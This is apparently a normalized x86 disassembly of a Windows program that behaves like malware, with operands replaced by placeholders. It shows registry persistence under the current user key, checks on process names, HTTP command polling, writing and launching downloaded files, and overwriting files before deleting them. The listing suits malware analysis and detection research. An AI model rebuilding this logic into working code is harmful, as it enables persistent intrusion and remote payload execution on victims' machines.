sub_401000
sub esp 0x210
lea eax [ esp + 0x8 ]
push 0x104
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
lea ecx [ esp + 0x8 ]
push 0x5c
push ecx
call strrchr
add esp 0x8
inc eax
lea edx [ esp + 0x10c ]
push eax
push rw-data
push edx
call sprintf
add esp 0xc
lea eax [ esp + 0x4 ]
lea ecx [ esp ]
push eax
push ecx
push 0x0
push 0xf003f
push 0x0
push 0x0
push 0x0
push rw-data
push 0x80000001
call [ RegCreateKeyExA@IAT ]
test eax eax
jne r-xdata
xor eax eax
add esp 0x210
retn
push esi
push edi
lea edi [ esp + 0x10 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea edx [ esp + 0x10 ]
push ecx
mov ecx [ esp + 0xc ]
push edx
push 0x1
push eax
lea eax [ esp + 0x124 ]
push eax
push ecx
call [ RegSetValueExA@IAT ]
mov edx [ esp + 0x8 ]
mov esi eax
push edx
call [ RegCloseKey@IAT ]
pop edi
test esi esi
pop esi
jne r-xdata
mov eax 0x1
add esp 0x210
retn
sub_4010c0
mov eax 0x1114
call sub_402780
push ebx
push ebp
push esi
lea eax [ esp + 0xc ]
push edi
push eax
lea ecx [ esp + 0x128 ]
push 0x1000
push ecx
call EnumProcesses
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x1114
retn
mov edi [ esp + 0x10 ]
mov [ esp + 0x14 ] 0x0
shr edi 0x2
mov [ esp + 0x1c ] edi
je r-xdata
mov ebp [ esp + 0x1128 ]
lea ebx [ esp + 0x124 ]
mov eax [ esp + 0x14 ]
add ebx 0x4
inc eax
cmp eax edi
mov [ esp + 0x14 ] eax
jb r-xdata
lea eax [ esp + 0x10 ]
lea ecx [ esp + 0x18 ]
push eax
push 0x4
push ecx
push esi
call EnumProcessModules
test eax eax
je r-xdata
mov edx [ ebx ]
push edx
push 0x0
push 0x410
call [ OpenProcess@IAT ]
mov esi eax
test esi esi
je r-xdata
push esi
call [ CloseHandle@IAT ]
mov eax [ esp + 0x18 ]
lea edx [ esp + 0x20 ]
push 0x104
push edx
push eax
push esi
call GetModuleBaseNameA
mov edi ebp
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
lea ecx [ esp + 0x24 ]
push ebp
push ecx
call _strnicmp
add esp 0xc
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x1114
retn
mov edi [ esp + 0x1c ]
sub_4011b0
sub esp 0x90
mov ecx 0x5
lea eax [ esp + 0x60 ]
push esi
push edi
mov esi rw-data
lea edi [ esp + 0x68 ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov ecx 0x5
mov esi rw-data
lea edi [ esp + 0x38 ]
push eax
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov ecx 0x5
mov esi rw-data
lea edi [ esp + 0xc ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov ecx 0x5
mov esi rw-data
lea edi [ esp + 0x24 ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov ecx 0x5
mov esi rw-data
lea edi [ esp + 0x54 ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov ecx 0x5
mov esi rw-data
lea edi [ esp + 0x84 ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
call sub_4012f0
lea ecx [ esp + 0x3c ]
push ecx
call sub_4012f0
lea edx [ esp + 0x10 ]
push edx
call sub_4012f0
lea eax [ esp + 0x2c ]
push eax
call sub_4012f0
lea ecx [ esp + 0x60 ]
push ecx
call sub_4012f0
lea edx [ esp + 0x94 ]
push edx
call sub_4012f0
lea eax [ esp + 0x80 ]
push eax
call sub_4010c0
add esp 0x1c
cmp eax 0x1
pop edi
pop esi
je r-xdata
xor eax eax
add esp 0x90
retn
lea ecx [ esp + 0x30 ]
push ecx
call sub_4010c0
add esp 0x4
cmp eax 0x1
je r-xdata
lea edx [ esp ]
push edx
call sub_4010c0
add esp 0x4
cmp eax 0x1
je r-xdata
lea eax [ esp + 0x18 ]
push eax
call sub_4010c0
add esp 0x4
cmp eax 0x1
je r-xdata
lea ecx [ esp + 0x48 ]
push ecx
call sub_4010c0
add esp 0x4
cmp eax 0x1
je r-xdata
lea edx [ esp + 0x78 ]
push edx
call sub_4010c0
add esp 0x4
cmp eax 0x1
je r-xdata
call sub_401000
add esp 0x90
retn
sub_4012f0
push esi
mov esi [ esp + 0x8 ]
push edi
push esi
call sub_402040
mov edi esi
or ecx 0xffffffff
xor eax eax
add esp 0x4
[ edi ]
not ecx
add ecx 0xfffffffe
cmp [ ecx + esi ] 0x20
jne r-xdata
mov [ ecx + esi + 0x1 ] 0x0
pop edi
xor eax eax
pop esi
retn
xor eax eax
mov [ ecx + esi + 0x1 ] al
pop edi
xor eax eax
pop esi
retn
mov dl [ ecx + esi - 0x1 ]
dec ecx
cmp dl 0x20
je r-xdata
cmp ecx eax
jle r-xdata
sub_401340
sub esp 0x298
lea eax [ esp + 0x108 ]
push ebx
push eax
push 0x202
call [ WSAStartup@IAT ]
mov ebx [ esp + 0x2a0 ]
lea ecx [ esp + 0xc ]
push 0x100
push ecx
mov [ ebx ] 0x0
call [ gethostname@IAT ]
lea edx [ esp + 0xc ]
push edx
call [ gethostbyname@IAT ]
test eax eax
mov [ esp + 0x8 ] eax
je r-xdata
call [ WSACleanup@IAT ]
xor eax eax
pop ebx
add esp 0x298
retn
mov eax [ eax + 0xc ]
mov edx [ eax ]
test edx edx
je r-xdata
push ebp
push esi
push edi
mov [ esp + 0x10 ] 0x0
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ edx ]
push ecx
call [ inet_ntoa@IAT ]
mov edi eax
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov eax [ esp + 0x10 ]
mov ecx edx
and ecx 0x3
add eax 0x4
[ edi ] [ esi ]
mov ecx [ esp + 0x14 ]
mov [ esp + 0x10 ] eax
mov edx [ ecx + 0xc ]
mov edx [ edx + eax ]
test edx edx
jne r-xdata
pop edi
pop esi
pop ebp
sub_401460
sub esp 0x434
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov edx [ rw-data ]
mov [ esp + 0x1c ] eax
mov eax [ rw-data ]
push edi
mov [ esp + 0x2c ] eax
mov eax [ rw-data ]
xor edi edi
mov [ esp + 0x24 ] ecx
test eax eax
mov [ esp + 0xc ] edi
mov [ esp + 0x28 ] edx
jne r-xdata
push ebx
push ebp
lea ecx [ esp + 0x40 ]
push esi
push ecx
call sub_401340
push rw-data
call atoi
push rw-data
mov [ esp + 0x28 ] eax
call atoi
push rw-data
mov [ esp + 0x30 ] eax
call atoi
mov ebx 0x1
add esp 0x10
mov [ esp + 0x28 ] eax
mov [ esp + 0x10 ] ebx
xor eax eax
pop edi
add esp 0x434
retn
mov eax [ esp + 0x1c ]
xor ebp ebp
test eax eax
jle r-xdata
mov [ esp + 0x10 ] ebx
test edi edi
je r-xdata
test edi edi
jne r-xdata
mov ecx [ esp + 0x10 ]
inc ecx
test edi edi
mov [ esp + 0x10 ] ecx
je r-xdata
mov eax [ esp + 0x1c ]
mov [ esp + 0x24 ] 0x0
test eax eax
mov [ esp + 0x14 ] 0x0
jle r-xdata
mov eax [ esp + 0x10 ]
push ebx
cmp eax ebx
push 0x50
jne r-xdata
cmp [ esp + 0x10 ] 0x2
jle r-xdata
pop esi
pop ebp
pop ebx
xor eax eax
pop edi
add esp 0x434
retn
mov eax [ esp + 0x14 ]
test eax eax
jne r-xdata
push rw-data
push rw-data
jmp r-xdata
lea ecx [ esp + 0x2c ]
lea edx [ esp + 0x44 ]
push ecx
push edx
call strstr
add esp 0x8
test eax eax
je r-xdata
test esi esi
je r-xdata
push rw-data
push esi
call strstr
mov edx eax
add esp 0x8
test edx edx
je r-xdata
push 0x0
push rw-data
call sub_401980
mov esi eax
mov eax [ rw-data ]
add esp 0x14
cmp eax 0xc8
jne r-xdata
cmp edi ebx
push ebx
push 0x50
jne r-xdata
cmp edi ebx
push ebx
push 0x50
jne r-xdata
test edi edi
jne r-xdata
push esi
call free
add esp 0x4
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
add edx ecx
xor ecx ecx
push rw-data
push rw-data
jmp r-xdata
push rw-data
push 0x0
push rw-data
jmp r-xdata
push rw-data
push 0x0
push rw-data
jmp r-xdata
mov eax [ esp + 0x1c ]
inc ebp
cmp ebp eax
jl r-xdata
mov eax [ esp + 0x20 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
shl eax 0x3
push eax
call _sleep
add esp 0x4
cmp al 0x2e
jne r-xdata
cmp al 0x39
jle r-xdata
test esi esi
je r-xdata
push rw-data
push esi
call strstr
mov ebp eax
add esp 0x8
test ebp ebp
je r-xdata
push 0x0
push rw-data
call sub_401980
mov esi eax
mov eax [ rw-data ]
mov edi 0xc8
add esp 0x14
cmp eax edi
jne r-xdata
mov [ esp + ecx + 0x2c ] 0x0
lea edi [ esp + 0x2c ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
cmp ecx 0x7
jb r-xdata
mov [ esp + ecx + 0x2c ] al
inc edx
inc ecx
cmp ecx 0xf
jl r-xdata
mov eax [ esp + 0x20 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea ecx [ eax + eax * 4 ]
shl ecx 0x3
push ecx
call _sleep
add esp 0x4
jmp r-xdata
push esi
call free
add esp 0x4
cmp [ rw-data ] edi
jne r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
add ebp ecx
cmp [ ebp ] 0x0
je r-xdata
mov edi [ esp + 0x18 ]
lea edi [ esp + 0x2c ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
cmp ecx 0xf
ja r-xdata
mov al [ edx ]
cmp al 0x30
jl r-xdata
mov eax [ esp + 0x24 ]
mov ecx [ esp + 0x1c ]
mov edi [ esp + 0x18 ]
inc eax
cmp eax ecx
mov [ esp + 0x24 ] eax
jl r-xdata
test esi esi
je r-xdata
test esi esi
mov [ esp + 0x14 ] ebx
je r-xdata
push 0x2
push rw-data
push ebp
call strncmp
add esp 0xc
test eax eax
jne r-xdata
mov edx [ esp + 0x10 ]
mov [ esp + 0x18 ] edx
mov eax [ rw-data ]
push eax
push esi
call sub_4021e0
push 0x2
push rw-data
push esi
call strncmp
add esp 0x14
test eax eax
jne r-xdata
push esi
call free
add esp 0x4
jmp r-xdata
push 0x2
push rw-data
push ebp
call strncmp
add esp 0xc
test eax eax
jne r-xdata
push rw-data
push rw-data
mov [ esp + 0x1c ] 0x2
call fopen
add esp 0x8
mov [ rw-data ] eax
test eax eax
je r-xdata
lea eax [ ebp + 0x2 ]
push rw-data
push eax
call strtok
push eax
call _strdup
mov ebx eax
add esp 0xc
test ebx ebx
je r-xdata
push esi
call free
push rw-data
call sub_4018f0
mov eax [ esp + 0x30 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
shl eax 0x3
push eax
call _sleep
push rw-data
call sub_402200
add esp 0x10
jmp r-xdata
mov ecx [ rw-data ]
push eax
push ecx
push ebx
push esi
call fwrite
mov edx [ rw-data ]
push edx
call fclose
add esp 0x14
mov edi [ esp + 0x3c ]
push ebx
call atoi
mov [ esp + 0x44 ] eax
mov edi ebx
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ebx
mov edi ecx
inc edi
mov [ esp + 0x44 ] edi
call free
add esp 0x8
jmp r-xdata
mov ebx 0x1
mov ebx [ esp + 0x40 ]
push ebx
push edi
call sub_4021e0
push rw-data
push rw-data
mov [ esp + 0x24 ] 0x2
call fopen
add esp 0x10
mov [ rw-data ] eax
test eax eax
je r-xdata
lea edi [ edi + ebp + 0x2 ]
test edi edi
je r-xdata
test esi esi
je r-xdata
push eax
push ebx
push 0x1
push edi
call fwrite
mov ecx [ rw-data ]
push ecx
call fclose
add esp 0x14
push rw-data
call sub_4018f0
mov eax [ esp + 0x2c ]
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea edx [ eax + eax * 4 ]
shl edx 0x3
push edx
call _sleep
push rw-data
call sub_402200
add esp 0xc
push esi
call free
add esp 0x4
sub_4018f0
sub esp 0x54
push edi
mov ecx 0x11
xor eax eax
lea edi [ esp + 0x14 ]
mov [ esp + 0x14 ] 0x44
mov edx [ esp + 0x5c ]
[ edi ]
mov [ esp + 0x44 ] ax
lea eax [ esp + 0x4 ]
lea ecx [ esp + 0x14 ]
push eax
push ecx
push 0x0
push 0x0
push 0x20
push 0x0
push 0x0
push 0x0
push edx
push 0x0
mov [ esp + 0x68 ] 0x81
call [ CreateProcessA@IAT ]
dec eax
pop edi
neg eax
sbb eax eax
add esp 0x54
retn
sub_401980
sub esp 0x10
push ebx
push ebp
push esi
push edi
push rw-data
mov [ esp + 0x1c ] 0x4
call _strdup
add esp 0x4
mov [ rw-data ] eax
push 0x0
push 0x0
push 0x0
push 0x4
push eax
call [ InternetOpenA@IAT ]
mov ebx eax
test ebx ebx
mov [ esp + 0x10 ] ebx
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x10
retn
mov eax [ esp + 0x30 ]
mov ecx [ esp + 0x2c ]
push 0x0
push 0x0
push 0x3
push 0x0
push 0x0
push eax
push ecx
push ebx
call [ InternetConnectA@IAT ]
mov ebp eax
test ebp ebp
jne r-xdata
mov eax [ esp + 0x34 ]
dec eax
je r-xdata
push ebx
call [ InternetCloseHandle@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x10
retn
mov eax [ esp + 0x24 ]
push 0x0
push 0x4400100
push 0x0
push 0x0
push 0x0
push eax
push rw-data
push ebp
call [ HttpOpenRequestA@IAT ]
mov esi eax
test esi esi
jne r-xdata
dec eax
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call [ HttpSendRequestA@IAT ]
jmp r-xdata
mov esi [ InternetCloseHandle@IAT ]
push ebp
call esi
push ebx
call esi
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x10
retn
mov esi [ esp + 0x24 ]
mov edx [ esp + 0x24 ]
push 0x0
push 0x4400100
push 0x0
push 0x0
push 0x0
push edx
push rw-data
push ebp
call [ HttpOpenRequestA@IAT ]
mov esi eax
test esi esi
jne r-xdata
lea ecx [ esp + 0x18 ]
push 0x0
lea edx [ esp + 0x18 ]
push ecx
push edx
push 0x20000013
push esi
call [ HttpQueryInfoA@IAT ]
mov eax [ esp + 0x14 ]
cmp eax 0x197
je r-xdata
push 0x3e8
call _sleep
add esp 0x4
test esi esi
je r-xdata
push 0x400
mov [ rw-data ] eax
call malloc
add esp 0x4
mov edi eax
xor ebx ebx
mov edx [ esp + 0x28 ]
or ecx 0xffffffff
mov edi edx
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push edx
push eax
push eax
push esi
call [ HttpSendRequestA@IAT ]
jmp r-xdata
mov esi [ InternetCloseHandle@IAT ]
push ebp
call esi
push ebx
call esi
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x10
retn
call [ GetLastError@IAT ]
xor eax eax
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esp + 0x1c ]
test eax eax
je r-xdata
push 0x0
push 0x7
push eax
push esi
call [ GetDesktopWindow@IAT ]
push eax
call [ InternetErrorDlg@IAT ]
push esi
mov esi [ InternetCloseHandle@IAT ]
call esi
push ebp
call esi
push ebx
call esi
mov edx [ esp + 0x14 ]
mov [ rw-data ] edx
push esi
mov esi [ InternetCloseHandle@IAT ]
mov [ rw-data ] 0x0
call esi
push ebp
call esi
mov eax [ esp + 0x10 ]
push eax
call esi
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x10
retn
push edi
call free
add esp 0x4
push esi
mov esi [ InternetCloseHandle@IAT ]
mov [ ebx + edi ] 0x0
mov [ rw-data ] ebx
call esi
push ebp
call esi
mov ecx [ esp + 0x10 ]
push ecx
call esi
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
add ebx eax
lea edx [ ebx + 0x400 ]
push edx
push edi
call realloc
add esp 0x8
mov edi eax
jmp r-xdata
lea eax [ esp + 0x1c ]
lea ecx [ ebx + edi ]
push eax
push 0x3ff
push ecx
push esi
call [ InternetReadFile@IAT ]
test eax eax
je r-xdata
sub_401bd0
sub esp 0x3c0
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov dx [ rw-data ]
push ebx
push ebp
push esi
push edi
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] ecx
mov ecx 0xa
xor eax eax
lea edi [ esp + 0x1a ]
mov [ esp + 0x18 ] dx
mov esi rw-data
[ edi ]
mov ecx 0x8
lea edi [ esp + 0x42 ]
[ edi ] [ esi ]
mov ecx [ rw-data ]
mov edx [ rw-data ]
movsw [ edi ] [ esi ]
mov [ esp + 0x64 ] eax
mov [ esp + 0x74 ] ecx
mov cx [ rw-data ]
mov [ esp + 0x68 ] eax
mov [ esp + 0x6c ] eax
mov [ esp + 0x80 ] cx
mov [ esp + 0x70 ] eax
mov eax [ rw-data ]
mov [ esp + 0x7c ] eax
mov ecx 0x9
xor eax eax
lea edi [ esp + 0x82 ]
mov [ esp + 0x78 ] edx
mov dx [ rw-data ]
[ edi ]
mov al [ rw-data ]
mov ecx 0xb
mov [ esp + 0xa8 ] al
xor eax eax
lea edi [ esp + 0xa9 ]
mov [ esp + 0xa6 ] dx
[ edi ]
mov ecx [ rw-data ]
mov edx [ rw-data ]
stosw [ edi ]
stosb [ edi ]
mov eax [ rw-data ]
mov [ esp + 0xd8 ] ecx
mov cl [ rw-data ]
mov [ esp + 0xe0 ] eax
mov [ esp + 0xe4 ] cl
mov ecx 0x9
xor eax eax
lea edi [ esp + 0xe5 ]
mov [ esp + 0xdc ] edx
mov edx [ rw-data ]
[ edi ]
mov ebp [ rw-data ]
mov bx [ rw-data ]
stosb [ edi ]
mov al [ rw-data ]
mov ecx 0x9
mov [ esp + 0x114 ] al
xor eax eax
lea edi [ esp + 0x115 ]
mov [ esp + 0x10a ] edx
mov [ esp + 0x10e ] ebp
mov [ esp + 0x112 ] bx
[ edi ]
mov ecx [ rw-data ]
stosw [ edi ]
stosb [ edi ]
mov eax [ rw-data ]
mov [ esp + 0x13c ] ecx
mov ecx [ rw-data ]
mov [ esp + 0x140 ] eax
mov ax [ rw-data ]
mov [ esp + 0x144 ] ecx
mov [ esp + 0x148 ] ax
mov ecx 0x9
xor eax eax
lea edi [ esp + 0x14a ]
[ edi ]
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov [ esp + 0x16e ] ecx
mov ecx [ rw-data ]
mov [ esp + 0x176 ] ecx
mov cx [ rw-data ]
mov [ esp + 0x172 ] eax
mov eax [ rw-data ]
mov [ esp + 0x17a ] eax
mov [ esp + 0x17e ] cx
mov ecx 0x8
xor eax eax
lea edi [ esp + 0x180 ]
mov esi rw-data
[ edi ]
mov eax [ rw-data ]
mov cx [ rw-data ]
mov [ esp + 0x1a0 ] eax
mov al [ rw-data ]
mov [ esp + 0x1a4 ] cx
mov [ esp + 0x1a6 ] al
mov ecx 0xa
xor eax eax
lea edi [ esp + 0x1a7 ]
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x8
lea edi [ esp + 0x1d2 ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
xor ecx ecx
mov eax [ rw-data ]
movsb [ edi ] [ esi ]
mov [ esp + 0x1f5 ] ecx
mov [ esp + 0x204 ] eax
mov [ esp + 0x1f9 ] ecx
xor eax eax
mov [ esp + 0x1fd ] ecx
lea edi [ esp + 0x20a ]
mov [ esp + 0x201 ] cx
mov esi rw-data
mov [ esp + 0x203 ] cl
mov cx [ rw-data ]
mov [ esp + 0x208 ] cx
mov ecx 0xb
[ edi ]
mov ecx 0x8
lea edi [ esp + 0x236 ]
[ edi ] [ esi ]
movsw [ edi ] [ esi ]
mov ecx [ rw-data ]
movsb [ edi ] [ esi ]
mov [ esp + 0x259 ] eax
mov [ esp + 0x268 ] ecx
mov cl [ rw-data ]
mov [ esp + 0x25d ] eax
mov [ esp + 0x261 ] eax
mov [ esp + 0x270 ] cl
mov [ esp + 0x265 ] ax
mov ecx 0xa
mov [ esp + 0x267 ] al
mov eax [ rw-data ]
mov [ esp + 0x26c ] eax
xor eax eax
lea edi [ esp + 0x271 ]
[ edi ]
stosb [ edi ]
mov [ esp + 0x29a ] edx
mov dl [ rw-data ]
mov ecx 0x9
xor eax eax
lea edi [ esp + 0x2a5 ]
mov [ esp + 0x29e ] ebp
mov [ esp + 0x2a2 ] bx
mov [ esp + 0x2a4 ] dl
[ edi ]
stosw [ edi ]
mov ebx [ esp + 0x3d4 ]
stosb [ edi ]
mov eax [ esp + 0x3d8 ]
push eax
push ebx
call [ DoEnvironmentSubstA@IAT ]
cmp [ ebx ] 0x25
jne r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x3c0
retn
xor ebp ebp
lea esi [ esp + 0x10 ]
lea eax [ ebp + ebp * 4 ]
lea ecx [ eax + eax * 4 ]
lea eax [ esp + 0x2cc ]
lea edx [ esp + ecx * 4 + 0x42 ]
push edx
push rw-data
push eax
call sprintf
push 0x25
push ebx
call strrchr
add esp 0x14
inc eax
mov edi eax
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x2cc ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
cmp ebp 0x7
[ edi ] [ esi ]
jl r-xdata
inc ebp
add esi 0x64
cmp ebp 0x7
jl r-xdata
lea edi [ esp + 0x2cc ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
lea eax [ esp + 0x2cc ]
push ecx
push eax
push ebx
call strncpy
lea edi [ esp + 0x2d8 ]
or ecx 0xffffffff
xor eax eax
add esp 0xc
[ edi ]
not ecx
dec ecx
mov [ ecx + ebx ] al
lea eax [ esp + 0x2cc ]
push rw-data
push eax
call sprintf
push 0x25
push ebx
call strrchr
add esp 0x10
inc eax
mov edi eax
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x2cc ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
and ecx 0x3
[ edi ] [ esi ]
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push esi
push ebx
call strncmp
add esp 0xc
test eax eax
je r-xdata
jmp r-xdata
sub_402040
push ebp
mov ebp [ esp + 0x8 ]
push esi
push edi
mov edi ebp
or ecx 0xffffffff
xor eax eax
xor esi esi
[ edi ]
not ecx
dec ecx
test ecx ecx
jle r-xdata
pop edi
pop esi
xor eax eax
pop ebp
retn
push ebx
cdq
sub eax edx
sar eax 0x1
test eax eax
jg r-xdata
xor edx edx
mov dl [ edi + lookup_table_40215c ]
jmp [ edx * 4 + jump_table_402138 ]
lea edi [ eax - 0x1 ]
cmp edi 0x7f
ja r-xdata
mov [ esi + ebp ] bl
inc esi
cmp esi ecx
jl r-xdata
movsx edx [ esi + ebp ]
test eax edx
je r-xdata
movsx edx [ esi + ebp ]
test eax edx
je r-xdata
movsx edx [ esi + ebp ]
test eax edx
je r-xdata
movsx edx [ esi + ebp ]
test eax edx
je r-xdata
movsx edx [ esi + ebp ]
test eax edx
je r-xdata
movsx edx [ esi + ebp ]
test eax edx
je r-xdata
movsx edx [ esi + ebp ]
test eax edx
je r-xdata
movsx edx [ esi + ebp ]
test eax edx
je r-xdata
xor bl bl
mov eax 0x80
pop ebx
pop edi
pop esi
xor eax eax
pop ebp
retn
and bl 0x7f
jmp r-xdata
or bl 0x80
jmp r-xdata
and bl 0xdf
jmp r-xdata
or bl 0x20
jmp r-xdata
and bl 0xbf
jmp r-xdata
or bl 0x40
jmp r-xdata
and bl 0xfd
jmp r-xdata
or bl 0x2
jmp r-xdata
and bl 0xef
jmp r-xdata
or bl 0x10
jmp r-xdata
and bl 0xf7
jmp r-xdata
or bl 0x8
jmp r-xdata
and bl 0xfb
jmp r-xdata
or bl 0x4
jmp r-xdata
and bl 0xfe
or bl 0x1
jmp r-xdata
sub_402200
push ecx
push ebx
push esi
push edi
mov edi [ esp + 0x14 ]
push edi
mov [ esp + 0x10 ] 0x0
call [ PathFileExistsA@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
mov eax 0x8
pop ebx
pop ecx
retn
push 0x80
push edi
call [ SetFileAttributesA@IAT ]
push rw-data
push edi
call fopen
mov ebx eax
add esp 0x8
test ebx ebx
je r-xdata
pop edi
pop esi
mov eax 0x7
pop ebx
pop ecx
retn
mov eax [ ebx + 0x10 ]
push eax
call _filelength
push ebx
mov esi eax
call fclose
add esp 0x8
test esi esi
jle r-xdata
push edi
call [ DeleteFileA@IAT ]
neg eax
sbb eax eax
pop edi
pop esi
add eax 0x6
pop ebx
pop ecx
retn
push esi
call malloc
mov ebx eax
add esp 0x4
test ebx ebx
je r-xdata
pop edi
pop esi
mov eax 0x4
pop ebx
pop ecx
retn
push ebp
push rw-data
push edi
call fopen
mov ebp eax
add esp 0x8
test ebp ebp
je r-xdata
push rw-data
push edi
call fopen
mov ebp eax
add esp 0x8
test ebp ebp
je r-xdata
mov ecx esi
or eax 0xffffffff
mov edx ecx
mov edi ebx
shr ecx 0x2
[ edi ]
mov ecx edx
push ebp
and ecx 0x3
push esi
push 0x1
push ebx
[ edi ]
call fwrite
push ebp
call fflush
push ebp
call fclose
mov edi [ esp + 0x30 ]
add esp 0x18
mov [ esp + 0x10 ] 0x1
push rw-data
push edi
call fopen
mov ebp eax
add esp 0x8
test ebp ebp
je r-xdata
mov ecx esi
xor eax eax
mov edx ecx
mov edi ebx
shr ecx 0x2
[ edi ]
mov ecx edx
push ebp
and ecx 0x3
push esi
push 0x1
push ebx
[ edi ]
call fwrite
push ebp
call fflush
push ebp
call fclose
mov edi [ esp + 0x30 ]
add esp 0x18
mov [ esp + 0x10 ] 0x1
mov esi [ esp + 0x10 ]
mov ecx esi
mov eax 0x55555555
mov edx ecx
mov edi ebx
shr ecx 0x2
[ edi ]
mov ecx edx
push ebp
and ecx 0x3
push esi
push 0x1
push ebx
[ edi ]
call fwrite
push ebp
call fflush
push ebp
call fclose
mov edi [ esp + 0x30 ]
add esp 0x18
mov esi 0x1
jmp r-xdata
pop edi
pop esi
mov eax 0x3
pop ebx
pop ecx
retn
push edi
call [ DeleteFileA@IAT ]
neg eax
sbb eax eax
pop edi
pop esi
add eax 0x2
pop ebx
pop ecx
retn
push ebx
call free
add esp 0x4
cmp esi 0x1
pop ebp
jne r-xdata
sub_4023c0
sub esp 0x184
push ebx
push esi
push edi
push 0x1
call _sleep
add esp 0x4
call sub_4011b0
mov [ rw-data ] eax
call sub_401950
mov ebx [ Sleep@IAT ]
test eax eax
je r-xdata
push 0x0
call ebx
call sub_401950
test eax eax
je r-xdata
mov esi [ PostThreadMessageA@IAT ]
mov edi [ GetCurrentThreadId@IAT ]
mov [ rw-data ] 0x0
push 0x1
push rw-data
call [ InitializeSecurityDescriptor@IAT ]
push 0x0
push 0x0
push 0x1
push rw-data
call [ SetSecurityDescriptorDacl@IAT ]
mov [ rw-data ] rw-data
jmp r-xdata
push 0x0
lea eax [ esp + 0x3c ]
push 0x0
push eax
call [ GetMessageA@IAT ]
call ebx
jmp r-xdata
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x184
retn 0x10
call esi
cmp eax 0x5
je r-xdata
push 0x0
call ebx
mov ecx [ rw-data ]
mov [ rw-data ] 0xc
push ecx
push rw-data
push rw-data
mov [ rw-data ] 0x1
call sprintf
add esp 0xc
push rw-data
push 0x0
push 0x0
call [ CreateMutexA@IAT ]
mov esi [ GetLastError@IAT ]
call esi
cmp eax 0xb7
je r-xdata
push 0x1
call _sleep
add esp 0x4
push 0x0
push 0x0
push 0x0
call edi
push eax
call esi
test eax eax
push 0x0
jne r-xdata
push rw-data
call sub_4012f0
push rw-data
call atoi
lea eax [ eax + eax * 4 ]
lea eax [ eax + eax * 4 ]
lea edx [ eax + eax * 4 ]
shl edx 0x3
push edx
call _sleep
push rw-data
call sub_4012f0
push rw-data
call sub_4012f0
push rw-data
call sub_4012f0
push rw-data
call sub_4012f0
push rw-data
call sub_4012f0
push rw-data
call sub_4012f0
push rw-data
call sub_4012f0
push rw-data
call sub_4012f0
push rw-data
call sub_4012f0
push rw-data
call sub_4012f0
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push rw-data
push rw-data
call strncpy
